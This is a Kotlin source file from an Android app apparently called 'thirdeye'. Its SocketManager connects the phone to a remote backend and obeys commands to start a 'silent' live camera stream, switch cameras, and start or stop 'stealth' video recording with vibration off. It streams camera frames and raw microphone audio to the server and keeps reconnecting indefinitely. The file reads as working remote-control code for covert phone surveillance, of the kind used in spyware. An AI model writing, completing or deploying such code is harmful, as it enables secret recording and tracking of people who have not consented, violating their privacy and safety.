package com.thirdeye.app.uploader

import android.content.Context
import android.util.Base64
import android.util.Log
import com.thirdeye.app.service.CameraRecordingService
import com.thirdeye.app.service.LiveStreamService
import com.thirdeye.app.utils.AppPreferences
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

object SocketManager {
    private const val TAG = "SocketManager"

    private var socket: Socket? = null
    @Volatile
    private var isConnecting = false
    private var currentServerUrl: String? = null
    private var heartbeatThread: Thread? = null

    fun isConnected(): Boolean {
        return socket?.connected() == true
    }

    fun initAndConnect(context: Context) {
        val prefs = AppPreferences(context)
        val serverUrl = prefs.serverUrl.trimEnd('/')

        // If connected to same server, nothing to do
        if (socket?.connected() == true && currentServerUrl == serverUrl) {
            return
        }

        // If connecting to same server already, wait
        if (isConnecting && currentServerUrl == serverUrl) {
            return
        }

        try {
            isConnecting = true
            currentServerUrl = serverUrl

            // Clean up existing socket if changing servers
            socket?.let {
                try {
                    it.disconnect()
                    it.off()
                } catch (e: Exception) {
                    // Ignore
                }
            }

            val options = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 1500
                reconnectionDelayMax = 10000
                timeout = 15000
                transports = arrayOf("websocket", "polling")
            }

            socket = IO.socket(URI.create(serverUrl), options)

            socket?.on(Socket.EVENT_CONNECT) {
                isConnecting = false
                Log.i(TAG, " Connected to central backend socket at $serverUrl!")
                registerDevice(context)
                startHeartbeat(context)
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnecting = false
                heartbeatThread?.interrupt()
                heartbeatThread = null
                Log.w(TAG, " Disconnected from backend socket")
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                isConnecting = false
                Log.w(TAG, "Socket connection error: ${args.firstOrNull()}")
            }

            // Command 1: Start silent live camera stream
            socket?.on("start-live-stream") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received START live stream command (Lens: $camera)")
                    LiveStreamService.startService(context, camera)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling start-live-stream", e)
                }
            }

            // Command 2: Stop live stream
            socket?.on("stop-live-stream") {
                Log.i(TAG, " Received STOP live stream command")
                LiveStreamService.stopService(context)
            }

            // Command 3: Switch camera (FRONT <-> BACK)
            socket?.on("switch-camera") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received SWITCH camera command: $camera")
                    LiveStreamService.switchCamera(context, camera)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling switch-camera", e)
                }
            }

            // Command 4: Remote start stealth video recording
            socket?.on("start-remote-recording") {
                try {
                    Log.i(TAG, " Received REMOTE START recording command")
                    CameraRecordingService.startService(context, enableVibration = false)
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting remote recording", e)
                }
            }

            // Command 5: Remote stop stealth video recording
            socket?.on("stop-remote-recording") {
                try {
                    Log.i(TAG, " Received REMOTE STOP recording command")
                    CameraRecordingService.stopService(context, enableVibration = false)
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping remote recording", e)
                }
            }

            socket?.connect()
        } catch (e: Exception) {
            isConnecting = false
            Log.e(TAG, "Socket init error", e)
        }
    }

    /**
     * Force immediate reconnect upon network availability change
     */
    fun reconnect(context: Context) {
        try {
            if (socket?.connected() != true) {
                socket?.connect() ?: initAndConnect(context)
            } else {
                registerDevice(context)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Reconnect error", e)
            initAndConnect(context)
        }
    }

    private fun startHeartbeat(context: Context) {
        heartbeatThread?.interrupt()
        heartbeatThread = Thread {
            try {
                while (!Thread.currentThread().isInterrupted && socket?.connected() == true) {
                    val battery = BackendClient.getBatteryLevel(context)
                    val payload = JSONObject().apply {
                        put("deviceId", BackendClient.getDeviceId(context))
                        put("batteryLevel", battery)
                        put("timestamp", System.currentTimeMillis())
                    }
                    socket?.emit("device-heartbeat", payload)
                    Thread.sleep(20000)
                }
            } catch (e: InterruptedException) {
                // Thread interrupted
            }
        }.apply {
            isDaemon = true
            name = "SocketHeartbeatThread"
            start()
        }
    }

    fun registerDevice(context: Context) {
        if (socket?.connected() != true) return

        try {
            val deviceId = BackendClient.getDeviceId(context)
            val deviceName = BackendClient.getDeviceName()
            val battery = BackendClient.getBatteryLevel(context)

            val payload = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("batteryLevel", battery)
            }

            socket?.emit("register-device", payload)
            Log.d(TAG, "Device registered on socket: $deviceId ($deviceName)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed registering device", e)
        }
    }

    /**
     * Streams a compressed JPEG frame to backend over WebSocket
     */
    fun sendFrame(context: Context, jpegBytes: ByteArray) {
        if (socket?.connected() != true) return

        try {
            val base64Frame = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("deviceId", BackendClient.getDeviceId(context))
                put("frame", base64Frame)
            }
            socket?.emit("stream-frame", payload)
        } catch (e: Exception) {
            Log.w(TAG, "Failed sending frame: ${e.message}")
        }
    }

    /**
     * Streams raw PCM 16-bit 16kHz audio chunk to backend over WebSocket
     */
    fun sendAudio(context: Context, pcmBytes: ByteArray) {
        if (socket?.connected() != true) return

        try {
            val base64Audio = Base64.encodeToString(pcmBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("deviceId", BackendClient.getDeviceId(context))
                put("audio", base64Audio)
                put("sampleRate", 16000)
            }
            socket?.emit("stream-audio", payload)
        } catch (e: Exception) {
            Log.w(TAG, "Failed sending audio: ${e.message}")
        }
    }

    fun disconnect() {
        heartbeatThread?.interrupt()
        heartbeatThread = null
        socket?.disconnect()
        socket?.off()
        socket = null
        isConnecting = false
        currentServerUrl = null
    }
}
